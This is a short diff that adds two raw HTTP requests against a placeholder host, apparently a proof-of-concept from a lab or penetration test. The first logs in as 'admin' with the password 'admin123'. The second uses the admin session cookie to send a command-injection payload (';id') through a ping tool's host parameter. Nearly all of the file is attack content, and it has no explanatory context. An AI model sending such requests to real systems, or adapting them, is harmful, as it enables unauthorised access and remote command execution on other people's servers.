@@ -1,0 +1,13 @@
+POST /api/login HTTP/1.1
+Host: TARGET:5000
+Content-Type: application/json
+Connection: close
+
+{"username":"admin","password":"admin123"}
+
+---
+
+GET /api/tools/ping?host=;id HTTP/1.1
+Host: TARGET:5000
+Cookie: session=<admin_session_cookie>
+Connection: close
